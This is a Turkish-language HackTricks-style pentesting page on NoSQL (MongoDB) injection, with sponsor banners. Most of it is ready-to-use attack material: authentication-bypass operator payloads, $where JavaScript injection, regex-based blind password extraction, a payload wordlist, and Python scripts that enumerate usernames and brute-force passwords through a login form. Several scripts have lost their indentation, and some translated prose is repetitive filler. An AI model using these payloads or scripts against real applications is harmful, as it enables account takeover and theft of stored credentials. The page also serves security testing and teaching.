# NoSQL enjeksiyonu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


## Sömürü

PHP'de, gönderilen parametreyi _parameter=foo_ yerine _parameter\[arrName]=foo_ olarak değiştirerek bir Dizi gönderebilirsiniz.

Sömürüler, bir **Operatör** ekleyerek yapılır:
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### Temel kimlik doğrulama atlatma

**Eşit olmayan ($ne) veya daha büyük ($gt) kullanarak**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

MongoDB, NoSQL veritabanı olarak bilinen bir veritabanı yönetim sistemidir. SQL tabanlı veritabanlarından farklı olarak, MongoDB doküman tabanlı bir yapıya sahiptir. Bu nedenle, SQL enjeksiyonu yerine NoSQL enjeksiyonu yapılması gerekmektedir.

NoSQL enjeksiyonu, MongoDB sorgularında güvenlik açıklarını sömürmek için kullanılan bir tekniktir. Bu tür bir enjeksiyon, kullanıcı girişi gibi verilerin doğrudan sorguya dahil edilmesiyle gerçekleştirilir. Saldırgan, bu enjeksiyonu kullanarak veritabanına yetkisiz erişim elde edebilir, veri çalabilir veya değiştirebilir.

NoSQL enjeksiyonu, SQL enjeksiyonuna benzer bir şekilde gerçekleştirilir. Saldırgan, sorguya eklenen verileri manipüle ederek, sorgunun beklenenden farklı bir şekilde çalışmasını sağlar. Bu manipülasyonlar sonucunda saldırgan, veritabanında istediği işlemleri gerçekleştirebilir.

NoSQL enjeksiyonu yaparken dikkat edilmesi gereken bazı noktalar vardır. Öncelikle, kullanıcı girişi gibi verilerin güvenli bir şekilde işlenmesi ve sorguya dahil edilmesi önemlidir. Verilerin doğrudan sorguya eklenmesi yerine, parametreler aracılığıyla sorguya dahil edilmesi tercih edilmelidir. Ayrıca, giriş verilerinin doğrulanması ve filtrelenmesi de önemlidir. Bu sayede, saldırganın manipülasyon yapması engellenebilir.

NoSQL enjeksiyonu, MongoDB veritabanlarında yaygın olarak kullanılan bir saldırı yöntemidir. Bu nedenle, geliştiricilerin ve sistem yöneticilerinin bu tür saldırılara karşı önlem alması önemlidir. Güvenlik açıklarının tespit edilmesi ve düzeltilmesi için düzenli olarak güvenlik testleri yapılmalıdır.
```javascript
query = { $where: `this.username == '${username}'` }
```
Bir saldırgan, sorguyu tautoloji (`'a'=='a'`) koşulunu sağlayarak tüm belgeleri döndürecek şekilde manipüle etmek için `admin' || 'a'=='a` gibi dizeleri giriş olarak kullanarak bunu istismar edebilir. Bu, SQL enjeksiyon saldırılarına benzer, burada `' or 1=1-- -` gibi girişler SQL sorgularını manipüle etmek için kullanılır. MongoDB'de, `' || 1==1//`, `' || 1==1%00` veya `admin' || 'a'=='a` gibi girişler kullanılarak benzer enjeksiyonlar yapılabilir.
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
```
### Uzunluk bilgisi çıkarma

NoSQL enjeksiyonu sırasında, hedef veritabanında saklanan verilerin uzunluğunu elde etmek önemli bir adımdır. Uzunluk bilgisi, saldırganın veritabanında depolanan verilerin yapısını anlamasına yardımcı olabilir ve daha fazla saldırı vektörü keşfetmesine olanak tanır.

Uzunluk bilgisini elde etmek için, saldırgan bir dizi karakteri hedef veritabanına gönderir ve yanıtın uzunluğunu kontrol eder. Yanıtın uzunluğu, saldırganın gönderdiği karakterlerin veritabanında nasıl işlendiğini anlamasına yardımcı olur.

Örneğin, bir NoSQL sorgusunda kullanılan bir parametre için uzunluk bilgisini elde etmek istiyorsak, aşağıdaki adımları izleyebiliriz:

1. Parametreyi bir karakter dizisi olarak oluşturun.
2. Parametreyi hedef veritabanına gönderin.
3. Yanıtın uzunluğunu kontrol edin.
4. Yanıtın uzunluğunu kullanarak parametrenin uzunluğunu tahmin edin.

Bu yöntem, NoSQL enjeksiyonu sırasında hedef veritabanının yapısını anlamak için kullanılan birçok teknikten sadece biridir. Uzunluk bilgisini elde etmek, saldırganın daha fazla bilgi toplamasına ve daha karmaşık saldırılar gerçekleştirmesine yardımcı olur.
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### **Veri** bilgilerini çıkarın

NoSQL injection vulnerabilities can allow an attacker to extract sensitive data from a target system. By exploiting these vulnerabilities, an attacker can bypass authentication mechanisms and directly access the database to retrieve data.

To extract data using NoSQL injection, an attacker can manipulate the input parameters of a query to retrieve information that they are not authorized to access. This can include usernames, passwords, personal information, or any other sensitive data stored in the database.

To identify and exploit NoSQL injection vulnerabilities, an attacker can use techniques such as injecting special characters, logical operators, or regular expressions into the query parameters. By carefully crafting these injections, an attacker can manipulate the query logic and retrieve desired data.

It is important for developers and security professionals to be aware of NoSQL injection vulnerabilities and implement proper input validation and sanitization techniques to prevent such attacks. Regular security assessments and penetration testing can also help identify and mitigate these vulnerabilities before they can be exploited by attackers.
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

MongoDB, NoSQL veritabanı olarak bilinen bir veritabanı yönetim sistemidir. SQL tabanlı veritabanlarından farklı olarak, MongoDB doküman tabanlı bir yapıya sahiptir. Bu nedenle, SQL enjeksiyonu yerine NoSQL enjeksiyonu yapılması gerekmektedir.

NoSQL enjeksiyonu, MongoDB sorgularında güvenlik açıklarını sömürmek için kullanılan bir tekniktir. Bu tür bir enjeksiyon, kullanıcı girişi gibi verilerin doğrudan sorguya dahil edilmesiyle gerçekleştirilir. Saldırgan, bu enjeksiyonu kullanarak veritabanına yetkisiz erişim elde edebilir, veri çalabilir veya değiştirebilir.

NoSQL enjeksiyonu, SQL enjeksiyonuna benzer bir şekilde gerçekleştirilir. Saldırgan, sorguya eklenen verileri manipüle ederek, sorgunun beklenenden farklı bir şekilde çalışmasını sağlar. Bu manipülasyonlar sonucunda saldırgan, veritabanında istediği işlemleri gerçekleştirebilir.

NoSQL enjeksiyonunu önlemek için aşağıdaki adımlar izlenebilir:

- Kullanıcı girişi gibi verilerin doğrudan sorguya dahil edilmemesi.
- Veri girişlerinin doğrulanması ve filtrelenmesi.
- Sorguların parametrelerle çalıştırılması.
- Güvenlik duvarları ve filtreleme mekanizmalarının kullanılması.

NoSQL enjeksiyonu, MongoDB gibi NoSQL veritabanlarında yaygın bir güvenlik açığıdır. Bu nedenle, geliştiricilerin ve sistem yöneticilerinin bu tür saldırılara karşı bilinçli olmaları ve gerekli önlemleri almaları önemlidir.
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### PHP Keyfi Fonksiyon Yürütme

Varsayılan olarak kullanılan [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) kütüphanesinin **$func** operatörünü kullanarak, [bu raporda](https://swarm.ptsecurity.com/rce-cockpit-cms/) olduğu gibi keyfi bir fonksiyonu yürütmek mümkün olabilir.
```python
"user":{"$func": "var_dump"}
```
![https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_check_10.png](<../.gitbook/assets/image (468).png>)

### Farklı koleksiyondan bilgi alın

Farklı bir koleksiyondan bilgi almak için [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) kullanmak mümkündür. Aşağıdaki örnekte, **`users`** adlı **farklı bir koleksiyondan** okuma yapılıyor ve bir jokerle eşleşen bir şifreye sahip tüm girişlerin sonuçları alınıyor.
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## MongoDB Payloadları

[Liste buradan](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```
## Kör NoSQL Betiği

```javascript
function login(username, password) {
    var query = { username: username, password: password };
    var result = db.users.find(query);
    if (result.length > 0) {
        return true;
    } else {
        return false;
    }
}
```

Bu betik, kullanıcı adı ve şifre parametrelerini alarak veritabanında kullanıcıları sorgular. Eğer sonuç boş değilse, yani kullanıcı bulunmuşsa `true` değeri döndürülür. Aksi takdirde `false` değeri döndürülür.
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
### POST girişinden kullanıcı adları ve şifreleri kaba kuvvet ile deneme

Bu, değiştirebileceğiniz basit bir betiktir, ancak önceki araçlar da bu görevi yapabilir.
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames(prefix):
usernames = []
params = {"username[$regex]":"", "password[$regex]":".*"}
for c in possible_chars:
username = "^" + prefix + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print(username)
for user in get_usernames(prefix + c):
usernames.append(user)
return usernames

for u in get_usernames(""):
get_password(u)
```
## Araçlar

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

## Referanslar

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
* [https://nullsweep.com/a-nosql-injection-primer-with-mongo/](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
* [https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)

<details>

<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturmak ve otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
